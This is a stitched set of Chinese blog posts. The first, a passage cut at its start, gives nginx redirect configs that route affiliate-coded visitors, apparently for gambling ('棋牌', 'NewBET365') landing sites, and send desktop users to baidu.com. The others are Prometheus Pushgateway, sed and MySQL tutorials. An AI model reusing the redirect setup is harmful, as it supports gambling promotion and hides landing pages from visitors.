而轮询定义的又是几个端口，每个端口跳转的域名也分别不同，注意轮询的端口不能和其他配置端口一样，要不然会报400错误 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081upstream webzu { server localhost:81; server localhost:82; server localhost:83; }server { listen 80 ; listen 443 ssl; server_name wohenliu.com; root /software/web家目录/wohenliu.com; charset utf-8; index index.html index.htm; if ($scheme = http ) { return 301 https://$host$request_uri; } ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;}server { listen 80 ; listen 443 ssl; server_name www.wohenliu.com; if ($scheme = http ) { return 301 https://$host$request_uri; } location /zimuliu1044 { alias /software/web家目录/wohenliu.com/zimuliu1044; index index.html index.htm; } location / { proxy_pass http://webzu; } ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;}server { listen 81; server_name localhost; if ($arg_c != '' ){ rewrite ^/ https://qitayuming1.com/register.html?c=$arg_c? permanent; } location /zimuliu1044 { alias /software/web家目录/wohenliu.com/zimuliu1044; index index.html index.htm; } location / { rewrite ^/ https://qitayuming/? permanent; }}server { listen 82; server_name localhost; if ($arg_c != '' ){ rewrite ^/ https://www.qitayuming2.com/register.html?c=$arg_c? permanent; } location /zimuliu1044 { alias /software/web家目录/wohenliu.com/zimuliu1044; index index.html index.htm; } location / { rewrite ^/ https://qitayuming.com/? permanent; }}server { listen 83; server_name localhost; if ($arg_c != '' ){ rewrite ^/ https://www.qitayuming3.com/register.html?c=$arg_c? permanent; } location /zimuliu1044 { alias /software/web家目录/wohenliu.com/zimuliu1044; index index.html index.htm; } location / { rewrite ^/ https://qitayuming.com/? permanent; }} 一般后?c后面的参数由域名管理者进行设置的， 下面是示列 1https://www.wohenliu.com/?c=9YPXQ&amp;type=NewBET365 6 ，配置代理线 域名指定的？后面的参数，跳转其他域名，其他？后面的参数就跳转默认其他代理域名12345678910111213141516171819202122232425262728293031323334353637server { listen 80; listen 443 ssl; server_name yichenxiu.com www.yichenxiu.com; root /software/tx棋牌落地站点/yichenxiu.com; #HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.key; ssl_certificate /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.nginx.crt; if ($scheme = http) { return 301 https://$host$request_uri; } if ($arg_c = 'QS3KC') { rewrite ^/(.*) https://www.www-yichenxiu.com:2020/?c=$arg_c? permanent; } if ($arg_c = 'ZY4SX'){ rewrite ^/(.*) https://www.www-yichenxiu.com:2020/?c=$arg_c? permanent; } if ($arg_c != '') { rewrite ^/(.*) https://qita.com:8989/?c=$arg_c? permanent; } location / { rewrite ^/ https://qita.com:8989 permanent; }} 三，Nginx区分PC或手机访问不同网站1， 简单的服务器端实现方法直接配置1234567891011121314151617181920212223242526server { listen 80; listen 443 ssl; listen 2021 ssl; server_name wohenliu.com; add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains&quot; always; charset utf-8; if ($scheme = http ) { return 301 https://$host$request_uri; } location / { root /software/web家目录/wohenliu.com; if ( $http_user_agent ~ &quot;(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC\\-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT\\-)|(SonyEricsson)|(NEC\\-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi\\-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG\\-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC\\-)|(SED\\-)|(EMOL\\-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)&quot; ) { root /software/web家目录/wohenliu.com/mobile; } index index.html index.htm;} ssl_certificate_key /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.key; ssl_certificate /etc/nginx/conf/域名证书/wohenliu.com/Nginx/wohenliu.com.nginx.crt;} 配置好后就去家目录创建一个移动端的目录，名为mobile，这样只要客户用手机访问就可以直接访问指定目录下的内容了，默认是访问正常的Pc页面， 2. 直接跳转其他地址，不用配置家目录123456789101112131415161718192021server { listen 80; listen 443 ssl; server_name yichenxiu.com www.yichenxiu.com; add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains&quot; always; charset utf-8; if ($scheme = http ) { return 301 https://$host$request_uri; } if ( $http_user_agent ~ &quot;(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC\\-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT\\-)|(SonyEricsson)|(NEC\\-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi\\-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG\\-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC\\-)|(SED\\-)|(EMOL\\-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)&quot; ) { rewrite ^/(.*) https://yichenxiu.com/xiazai.html break; } location / { rewrite ^/(.*) https://baidu.com$1 break;} ssl_certificate_key /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.key; ssl_certificate /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.nginx.crt;} 这样配置手机端访问就跳转到 手机端访问的域名，电脑就跳转到其他PC页面 3, 访问手机端跳转默认页面，访问电脑端轮询跳转其他h5页面12345678910111213141516171819202122232425262728293031323334353637383940414243upstream chuan { server localhost:1024 weight=1; server localhost:1025 weight=1;}server { listen 80; listen 443 ssl; server_name yichenxiu.com www.yichenxiu.com; root /software/落地站点/yichenxiu.com; # HSTS add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-XSS-Protection &quot;1&quot;; ssl_certificate_key /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.key; ssl_certificate /etc/nginx/conf/域名证书/yichenxiu.com/Nginx/yichenxiu.com.nginx.crt; if ( $server_port = 80 ){ rewrite ^/(.*) https://www.yichenxiu.com permanent; } location / { if ($http_user_agent !~* (mobile|nokia|iphone|ipad|android|samsung|htc|blackberry)) { proxy_pass http://chuan; } }}server { listen 1024; server_name localhost; location / { rewrite ^/ https://yichenh5.cc:8989 permanent; }}server { listen 1025; server_name localhost; location / { rewrite ^/ https://yichenh5.net:8989 permanent;}} 这样手机访问就是下载落地页，电脑访问就是pc页域名 4， 配置域名指定代理链接统计网站访问12345678910111213141516171819202122232425262728293031323334353637383940 if ($scheme = http) { return 301 https://$host$request_uri; } location /QS3KC { alias /software/tx棋牌落地站点/cq88ad.com; index index.html; } location / { if ($arg_c = 'QS3KC') { rewrite ^/(.*) https://cq88ad.com/QS3KC permanent; } if ($arg_c = 'ZY4SX'){ rewrite ^/(.*) https://www.www-8cq88.com/?c=$arg_c? permanent; } if ($arg_c = 'ZEUN1'){ rewrite ^/(.*) https://www.www-8cq88.com/?c=$arg_c? permanent; } if ($arg_c = 'RQPOC'){ rewrite ^/(.*) https://www.www-8cq88.com/?c=$arg_c? permanent; } rewrite ^/ https://cq88ad1.com:8989 permanent; }}","link":"/2020/08/03/nginx_server%E6%AE%B5%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/"},{"title":"Prometheus的Pushgateway工具","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus server2.com 192.168.224.12 Centos7.6 二、Pushgateway1、Pushgateway 简介 Pushgateway 是 Prometheus 生态中一个重要工具，使用它的原因主要是： Prometheus 采用 pull 模式，可能由于不在一个子网或者防火墙原因，导致 Prometheus 无法直接拉取各个 target 数据。 在监控业务数据的时候，需要将不同数据汇总, 由 Prometheus 统一收集。 当exporter不能满足需要时，也可以通过自定义（python、shell、java）监控我们想要的数据。 由于以上原因，不得不使用 pushgateway，但在使用之前，有必要了解一下它的一些弊端： 将多个节点数据汇总到 pushgateway, 如果 pushgateway 挂了，受影响比多个 target 大。 Prometheus 拉取状态 up 只针对 pushgateway, 无法做到对每个节点有效。 Pushgateway 可以持久化推送给它的所有监控数据。 因此，即使你的监控已经下线，prometheus 还会拉取到旧的监控数据，需要手动清理 pushgateway 不要的数据。 2、二进制安装官网下载地址https://prometheus.io/download/ 1234567891011wget https://github.com/prometheus/pushgateway/releases/download/v1.5.1/pushgateway-1.5.1.linux-amd64.tar.gztar xzf pushgateway-1.5.1.linux-amd64.tar.gzls -l mkdir /usr/local/Prometheus -pmv pushgateway-1.5.1.linux-amd64 /usr/local/Prometheus/pushgatewayls -l /usr/local/Prometheus/pushgateway 更改pushgateway文件夹权限： 1chown prometheus:prometheus -R /usr/local/Prometheus/pushgateway 创建 systemd 服务 1234567891011121314cat &gt;/etc/systemd/system/pushgateway.service &lt;&lt; &quot;EOF&quot;[Unit]Description=Prometheus Push GatewayAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/Prometheus/pushgateway/pushgateway[Install]WantedBy=multi-user.targetEOF 启动 12systemctl daemon-reloadsystemctl start pushgateway.service 加入到开机自启动 1systemctl enable pushgateway.service 检查 1systemctl status pushgateway.service 检查日志 1journalctl -u pushgateway.service -f 3、docker安装docker命令行运行 1docker run -d -p 9091:9091 --restart=always --name pushgateway prom/pushgateway docker-compose运行 123mkdir /data/pushgatewaycd /data/pushgateway 123456789101112cat &gt;docker-compose.yaml &lt;&lt;EOFversion: '3.3'services: pushgateway: image: prom/pushgateway container_name: pushgateway restart: always expose: - 9091 ports: - &quot;9091:9091&quot;EOF 启动 1docker-compose up -d 检查 1docker ps 4、Prometheus配置去pull拉取pushgateway收集到的数据。 12#进入到prometheus安装目录cd /data/docker-prometheus 通过cat在prometheus.yml文件末尾添加 12345678cat &gt;&gt; prometheus/prometheus.yml &lt;&lt;&quot;EOF&quot; - job_name: pushgateway honor_labels: true #加上此配置，exporter节点上传数据中的一些标签将不会被pushgateway节点的相同标签覆盖 static_configs: - targets: ['192.168.224.11:9091'] labels: instance: pushgatewayEOF 重载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/targets?search= 5、向Pushgateway推送监控数据使用curl正常情况我们会使用 Client SDK 推送数据到 pushgateway, 但是我们还可以curl调用 API 来管理, 例如： 向 {job=&quot;some_job&quot;} 添加单条数据： 1echo &quot;some_metric 3.14&quot; | curl --data-binary @- http://192.168.224.11:9091/metrics/job/some_job 添加更多更复杂数据，通常数据会带上 instance（some_instance为instance名）, 表示来源位置： 1234567cat &lt;&lt;EOF | curl --data-binary @- http://192.168.224.11:9091/metrics/job/some_job/instance/some_instance# TYPE some_metric countersome_metric{label=&quot;val1&quot;} 42# TYPE another_metric gauge# HELP another_metric Just an example.another_metric 2398.283EOF 删除某个组下的某实例的所有数据： 1curl -X DELETE http://192.168.224.11:9091/metrics/job/some_job/instance/some_instance 删除某个组下的所有数据： 1curl -X DELETE http://192.168.224.11:9091/metrics/job/some_job 检查 123http://192.168.224.11:9090/graphhttp://192.168.224.11:9091/metrics 使用python文档 安装prometheus_client模块 安装pip 1yum install python3-pip 通过pip安装prometheus_client 1pip3 install prometheus_client python代码 123456from prometheus_client import CollectorRegistry, Gauge, push_to_gatewayregistry = CollectorRegistry()g = Gauge('job_last_success_unixtime', 'Last time a batch job successfully finished', registry=registry)g.set_to_current_time()push_to_gateway('localhost:9091', job='batchA', registry=registry) 6、监控data数据目录下的文件数量（需求）shell脚本12345cat &gt;&gt;/opt/file_num.sh&lt;&lt;&quot;EOF&quot;#!/bin/shFILENUM=`ls -l /data |sed 1d| wc -l`echo &quot;data_file_num ${FILENUM}&quot; | curl --data-binary @- http://192.168.224.11:9091/metrics/job/test_job/instance/testEOF 定时任务1*/1 * * * * /bin/sh /opt/file_num.sh &gt;/dev/null 2&gt;&amp;1 python脚本1234567891011121314cat &gt;&gt;/opt/file_num.py&lt;&lt;&quot;EOF&quot;from prometheus_client import CollectorRegistry, Gauge, push_to_gatewayimport ospath = '/data' # 输入文件夹地址files = os.listdir(path) # 读入文件夹num_png = len(files) # 统计文件夹中的文件个数registry = CollectorRegistry()g = Gauge('python_data_file_num', 'data file num', ['instance'], registry=registry)g.labels('test').set(num_png)push_to_gateway('192.168.224.11:9091', job='test_job', registry=registry)EOF 定时任务1*/1 * * * * /usr/bin/python3 /opt/file_num.py &gt;/dev/null 2&gt;&amp;1 7、配置告警规则例如：当data目录下的文件数量超过5，报警出来 12345678910111213cat &gt;&gt; prometheus/rules/pushgateway.yml &lt;&lt;&quot;EOF&quot;groups:- name: pushgateway rules: - alert: DataFileNum expr: data_file_num &gt; 5 for: 0m labels: severity: warning annotations: summary: 'data数据目录文件数过多' description: &quot;data数据目录文件数&gt;5,当前数量:{{ $value }}&quot;EOF 重载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/alerts?search= 8、grafana添加图形9、总结当然上面只是个举例： 你也可以监控任何你想要监控的数据","link":"/2023/05/08/pushgateway/"},{"title":"sed的常用命令的使用","text":"sed 的常用命令的使用sed 会根据脚本命令来处理文本文件中的数据，这些命令要么从命令行中输入，要么存储在一个文本文件中，此命令执行数据的顺序如下： 每次仅读取一行内容； 根据提供的规则命令匹配并修改数据。注意，sed 默认不会直接修改源文件数据，而是会将数据复制到缓冲区中，修改也仅限于缓冲区中的数据； 将执行结果输出。 当一行数据匹配完成后，它会继续读取下一行数据，并重复这个过程，直到将文件中所有数据处理完毕。 sed 命令的基本格式如下： 12[root@localhost ~]# sed [选项] [脚本命令] 文件名 该命令常用的选项及含义，如表 1 所示。 选项 含义 -e 脚本命令 该选项会将其后跟的脚本命令添加到已有的命令中。 -f 脚本命令文件 该选项会将其后文件中的脚本命令添加到已有的命令中。 -n 默认情况下，sed 会在所有的脚本指定执行完毕后，会自动输出处理后的内容，而该选项会屏蔽启动输出，需使用 print 命令来完成输出。 -i 此选项会直接修改源文件，要慎用。 成功使用 sed 命令的关键在于掌握各式各样的脚本命令及格式，它能帮你定制编辑文件的规则。 sed脚本命令sed s 替换脚本命令此命令的基本格式为： [address]s/pattern/replacement/flags 其中，address 表示指定要操作的具体行，pattern 指的是需要替换的内容，replacement 指的是要替换的新内容。此命令中常用的 flags 标记如表 2 所示。 flags 标记 功能 n 1~512 之间的数字，表示指定要替换的字符串出现第几次时才进行替换，例如，一行中有 3 个 A，但用户只想替换第二个 A，这是就用到这个标记； g 对数据中所有匹配到的内容进行替换，如果没有 g，则只会在第一次匹配成功时做替换操作。例如，一行数据中有 3 个 A，则只会替换第一个 A； p 会打印与替换命令中指定的模式匹配的行。此标记通常与 -n 选项一起使用。 w file 将缓冲区中的内容写到指定的 file 文件中； &amp; 用正则表达式匹配的内容进行替换； \\n 匹配第 n 个子串，该子串之前在 pattern 中用 () 指定。 \\ 转义（转义替换部分包含：&amp;、\\ 等） 比如，可以指定 sed 用新文本替换第几处模式匹配的地方： 1234vim test.txtThis is a test of the test script.This is the second test of the test script. 123sed 's/test/trial/2' test.txtThis is a test of the trial script.This is the second test of the trial script. 可以看到，使用数字 2 作为标记的结果就是，sed 编辑器只替换每行中第 2 次出现的匹配模式。 如果要用新文件替换所有匹配的字符串，可以使用 g 标记： 123sed 's/test/trial/g' test.txtThis is a trial of the trial script.This is the second trial of the trial script. -n 选项会禁止 sed 输出，但 p 标记会输出修改过的行，将二者匹配使用的效果就是只输出被替换命令修改过的行，例如： 12sed -n 's/test/trial/p' test1.txt This is a trial line. w 标记会将匹配后的结果保存到指定文件中，比如： 123sed 's/test/trial/w testnew.txt' test1.txt This is a trial line.This is a different line. cat testnew.txtThis is a trial line. 在使用 s 脚本命令时，替换类似文件路径的字符串会比较麻烦，需要将路径中的正斜线进行转义，例如： 1sed 's/\\/bin\\/bash/\\/bin\\/csh/' /etc/passwd sed d 替换脚本命令此命令的基本格式为： [address]d 如果需要删除文本中的特定行，可以用 d 脚本命令，它会删除指定行中的所有内容。但使用该命令时要特别小心，如果你忘记指定具体行的话，文件中的所有内容都会被删除，举个例子： cat test.txtThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy dog sed ‘d’ test.txt #什么也不输出，证明成了空文件 当和指定地址一起使用时，删除命令显然能发挥出大的功用。可以从数据流中删除特定的文本行。 address 的具体写法后续会做详细介绍，这里只给大家举几个简单的例子： 12345678910cat test.txt This is line number 1.This is line number 2.This is line number 3.This is line number 4. sed '3d' test.txt This is line number 1.This is line number 2.This is line number 4. 或者通过特定行区间指定，比如删除 data6.txt 文件内容中的第 2、3行： 123sed '2,3d' test.txt This is line number 1.This is line number 4. 也可以使用两个文本模式来删除某个区间内的行，但这么做时要小心，你指定的第一个模式会“打开”行删除功能，第二个模式会“关闭”行删除功能，因此，sed 会删除两个指定行之间的所有行（包括指定的行），例如： 12sed '/1/,/3/d' test.txt This is line number 4. 或者通过特殊的文件结尾字符，比如删除 data6.txt 文件内容中第 3 行开始的所有的内容： sed ‘3,$d’ test.txtThis is line number 1.This is line number 2. 在此强调，在默认情况下 sed 并不会修改原始文件，这里被删除的行只是从 sed 的输出中消失了，原始文件没做任何改变。 sed a 和 i 脚本命令a 命令表示在指定行的后面附加一行，i 命令表示在指定行的前面插入一行，这里之所以要同时介绍这 2 个脚本命令，因为它们的基本格式完全相同，如下所示： [address]a（或 i）\\新文本内容 下面分别就这 2 个命令，举几个例子。比如说，将一个新行插入到数据流第三行前，执行命令如下： 123456 sed '3i This is an inserted line.' test.txt This is line number 1.This is line number 2.This is an inserted line.This is line number 3.This is line number 4. 再比如说，将一个新行附加到数据流中第三行后，执行命令如下 123456sed '3a This is an inserted line.' test.txt This is line number 1.This is line number 2.This is line number 3.This is an inserted line.This is line number 4. 如果你想将一个多行数据添加到数据流中，只需对要插入或附加的文本中的每一行末尾（除最后一行）添加反斜线即可，例如： 12345678sed '1i This is one line of new text.\\This another line of new text.' test.txtThis is one line of new text.This another line of new text.This is line number 1.This is line number 2.This is line number 3.This is line number 4. 可以看到，指定的两行都会被添加到数据流中。 sed c 替换脚本命令c 命令表示将指定行中的所有内容，替换成该选项后面的字符串。该命令的基本格式为： 12345sed '3cThis is a changed line of text.' test.txt This is line number 1.This is line number 2.This is a changed line of text.This is line number 4. sed r 脚本命令r 命令用于将一个独立文件的数据插入到当前数据流的指定位置，该命令的基本格式为： [address]r filename sed 命令会将 filename 文件中的内容插入到 address 指定行的后面，比如说： 12345678910[root@server1 ~]# cat test2.txt This is an added line.This is the second added line.[root@server1 ~]# sed '3r test2.txt' test.txt This is line number 1.This is line number 2.This is line number 3.This is an added line.This is the second added line.This is line number 4. 如果你想将指定文件中的数据插入到数据流的末尾，可以使用 $ 地址符，例如： 1234567 sed '$r test2.txt' test.txt This is line number 1.This is line number 2.This is line number 3.This is line number 4.This is an added line.This is the second added line. sed q 退出脚本命令q 命令的作用是使 sed 命令在第一次匹配任务结束后，退出 sed 程序，不再进行对后续数据的处理。比如： 123sed '2q' test.txt This is line number 1.This is line number 2. 可以看到，sed 命令在打印输出第 2 行之后，就停止了，是 q 命令造成的，再比如： 12sed '/number 1/{ s/number 1/number 0/;q; }' test.txtThis is line number 0. [root@localhost ~]# sed ‘/number 1/{ s/number 1/number 0/;q; }’ test.txtThis is line number 0. 使用 q 命令之后，sed 命令会在匹配到 number 1 时，将其替换成 number 0，然后直接退出。 sed 脚本命令的寻址方式前面在介绍各个脚本命令时，我们一直忽略了对 address 部分的介绍。对各个脚本命令来说，address 用来表明该脚本命令作用到文本中的具体行。 [address]脚本命令 或者 address { 多个脚本命令} 以上两种形式在前面例子中都有具体实例，因此这里不再做过多赘述。 以数字形式指定行区间当使用数字方式的行寻址时，可以用行在文本流中的行位置来引用。sed 会将文本流中的第一行编号为 1，然后继续按顺序为接下来的行分配行号。 在脚本命令中，指定的地址可以是单个行号，或是用起始行号、逗号以及结尾行号指定的一定区间范围内的行。这里举一个 sed 命令作用到指定行号的例子： 123456 [root@localhost ~]#sed '2s/dog/cat/' data1.txtThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy catThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy dog 可以看到，sed 只修改地址指定的第二行的文本。下面的例子中使用了行地址区间： 12345[root@localhost ~]# sed '2,3s/dog/cat/' data1.txtThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy catThe quick brown fox jumps over the lazy catThe quick brown fox jumps over the lazy dog 在此基础上，如果想将命令作用到文本中从某行开始的所有行，可以用特殊地址——美元符（$）： 12345[root@localhost ~]# sed '2,$s/dog/cat/' data1.txtThe quick brown fox jumps over the lazy dogThe quick brown fox jumps over the lazy catThe quick brown fox jumps over the lazy catThe quick brown fox jumps over the lazy cat sed 常用选项 -i 的使用替换指定文件的内容 123456sed -i 's/This/这个/g' test.txtcat test.txt 这个 is line number 1.这个 is line number 2.这个 is line number 3.这个 is line number 4. s 是替换，g是全局替换 替换指定目录下所有文件的指定内容 123456789101112131415161718192021222324ls test/test.txt test.txt1 test.txt2 test.txt3[root@server1 ~]# cat test/test.txtThis is line number 1.This is line number 2.This is line number 3.This is line number 4.test.txt 和test.txt1-3的内容是一样的下面这条命令是查看test目录下所有有This内容的文件名，grep -rl &quot;This&quot; testtest/test.txttest/test.txt1test/test.txt2test/test.txt3现在开始替换sed -i 's/This/这个/g' `grep -rl &quot;This&quot; test`现在test目录下的所有的文件都替换好了cat test/test.txt这个 is line number 1.这个 is line number 2.这个 is line number 3.这个 is line number 4.","link":"/2020/08/05/sed_%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"mysql基础","text":"mysql基础数据库模型概述 第一类概念模型（conceptual model）,也称信息模型，她是按用户的观点来对数据和信息建模， 主要用于数据库设计。 第二类中的逻辑模型主要包括层次模型（hierarchical model）、网状模型（network model)、关系模型（relational model）、面向对象数据模型（object oriented data model）和对象关系数据模型（object relational data model）、半结构化数据模型（semistructured data model）等。它是按计算机系统的观点对数据建模，主要用数据库管理系统的实现。 第二类中的物理模型是对数据最底层的抽象，它描述数据在系统内部的表示方式和存取方法，或在磁盘或磁带上的存储方式和存取方法，是面向计算机系统的。物理模型的具体实现是数据库管理系统的任务，数据库设计人员要了解和选择物理模型，最终用户则不必考虑物理级的细节。 数据模型是数据库系统的核心和基础。各种机器上实现的数据库管理系统软件都是基于某种数据模型或者说是支持某种数据模型的。 常用的数据模型 层次模型（hierarchical model) 网状模型（network model) 关系模型（relational model ) 面向对象数据模型（object oriented data model) 对象关系数据模型（object relational data model) 半结构化数据模型（semistructure data model) 其中层次模型和网状模型统称为格式化模型。 关系模型是最重要的一种数据模型。关系数据库系统采用关系模型作为数据的组织方式。 1.关系模型的数据结构 关系模型与以往的模型不同，它是建立在严格的数学概念的基础上的。从用户观点看，关系模型由一组关系组成。每个关系的数据结构是一张规范化的二维表。 关系（relation）：一个关系对应通常说的一张表。 元组（tuple）：表中的一行即为一个元组。 属性（attribute）：表中的一列即为一个属性，给每一个属性起一个名称即属性名。 码（ key）：也称为码键。表中的某个属性组，它可以唯一确定一个元组， 如学号可以唯一确定一个学生，也就成为本关系的码。 域（domain）：域是一组具有相同数据类型的值的集合。属性的取值范围来自某个域 。如人的年龄一般在1～120岁之间，大学生年龄属性的域是(15～45岁），性别的域是（男， 女），系名的域是一个学校所有系名的集合。 分量：元组中的一个属性值。 关系模式：对关系的描述，一般表示为 关系名（属性1，属性2，……，属性n) 关系术语 一般表格术语 关系名 表名 关系模式 表头（表格的描述） 关系 （一张）二维表 元组 记录或行 属性 列 属性名 列名 属性值 列值 分量 一条记录中的一个列值 非规范关系 表中有表（大表中嵌有小表） 关系数据库关系模型的数据结构非常简单，只包含单一的数据结构 —- 关系。在用户看来，关系模型中数据的逻辑结构是一张扁平的二维表。 关系模型的数据结构虽然简单却能够表达丰富的语义，描述出现实世界的实体以及实体间的各种联系。也就是说，在关系模型中，现实世界的实体以及实体间的各种联系均用单一的结构类型，即关系来表示。 关系数据库 在关系模型中，实体以及实体间的联系都是用关系来表示的。例如导师实体、研究生实体、导师与研究生之间的一对多联系都可以分别用一个关系来表示。在一个给定的应用领域中，所有关系的集合构成一个关系数据库。 关系数据库也有型和值之分。关系数据库的型也称为关系数据库模式，是对关系数据库的描述。 关系数据库模式包括若干域的定义，以及在这些域上定义的若干关系模式。 关系数据库的值是这些关系模式在某一时刻对应的关系的集合， 通常就称为关系数据库。 在关系数据模型中实体及实体间的联系都用表来表示，但表是关系数据的逻辑模型。在关系数据库的物理组织中，有的关系数据库管理系统中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；有的关系数据库管理系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表、索引等存储结构，并进行存储管理。 关系操作 关系模型给出了关系操作的能力的说明，但不对关系数据库管理系统语言给出具体的语法要求，也就是说不同的关系数据库管理系统可以定义和开发不同的语言来实现这些操作。 基本的关系操作 关系模型中常用的关系操作包括查询（quey）操作和插入（insert）、 删除（delete）、修改（update）操作两大部分。 关系的查询表达能力很强，是关系操作中最主要的部分。查询操作又可以分为选择(select）、投影（project）、连接（join）、除（ divide）、并（union）、差(except）、交(intersection）、笛卡儿积等。其中选择、投影、并、差、笛卡儿积是5种基本操作，其他操作可以用基本操作来定义和导出，就像乘法可以用加法来定义和导出一样。 关系操作的特点是集合操作方式，即操作的对象和结果都是集合。 这种操作方式也称为一次一集合（set-at-a-time）的方式。相应地，非关系数据模型的数据操作方式则为一次一记录（record-at-a-time）的方式。 关系数据库标准语言SQL 结构化查询语言（Structured Query Language,SQL）是关系数据库的标准语言，也是一个通用的、功能极强的关系数据库语言。其功能不仅仅是查询，而且包括数据库模式创建、数据库数据的插入与修改、数据库安全性完整性定义与控制等一系列功能。 自SQL成为国际标准语言以后，各个数据库厂家纷纷推出各自的SQL软件或与SQL的接口软件。这就使大多数数据库均用SQL作为共同的数据存取语言和标准接口，使不同数据库系统之间的互操作有了共同的基础。SQL已成为数据库领域中的主流语言，其意义十分重大。有人把确立SQL为关系数据库语言标准及其后的发展称为是一场革命。 语言简洁、易学易用 SQL功能极强，但由于设计巧妙，语言十分简洁，完成核心功能只用了9个动词，如下表所示： SQL功能 动词 数据查询 SELECT 数据定义 CREATE，DROP，ALTER 数据操纵 INSERT，UPDATE，DELETE 数据控制 GRANT，REVOKE 数据定义 关系数据库系统支持三级模式结构，其模式、外模式和内模式中的基本对象有模式、表、视图和索引等。因此SQL的数据定义功能包括模式定义、表定义、视图和索引的定义， 如下表所示。 操作对象 操作方式 创建 删除 修改 模式 CREATE SCHEMA DROP SCHEMA 表 CREATE TABLE DROP TABLE ALTER TABLE 视图 CREATE VIEW DROP VIEW 索引 CREATE INDEX DROP INDEX ALTER INDEX SQL标准不提供修改模式定义和修改视图定义的操作。 用户如果想修改这些对象，只能先将它们删除然后再重建。SQL标准也没有提供索引相关的语句，但为了提高查询效率， 商用关系数据库管理系统通常都提供了索引机制和相关的语旬。 在早期的数据库系统中，所有数据库对象都属于一个数据库，也就是说只有一个命名空间。现代的关系数据库管理系统提供了一个层次化的数据库对象命名机制，一个关系数据库管理系统的实例（instance）中可以建立多个数据库，一个数据库中可以建立多个模式，一个模式下通常包括多个表、视图和索引等数据库对象。 MySQLMySQL是最流行的开 SQL数据库管理系统，由Oracle Corporation开发，分发和支持。MySQL网站（http://www.mysql.com/）提供了有关MySQL软件的最新信息。 MySQL是一个数据库管理系统。数据库是结构化的数据集合。从简单的购物清单到图片库，或者企业网络中的大量信息，它都可以是任何东西。要添加，访问和处理存储在计算机数据库中的数据，您需要一个数据库管理系统，例如MySQL Server。由于计算机非常擅长处理大量数据，因此数据库管理系统作为独立的实用程序或其他应用程序的一部分，在计算中起着核心作用。 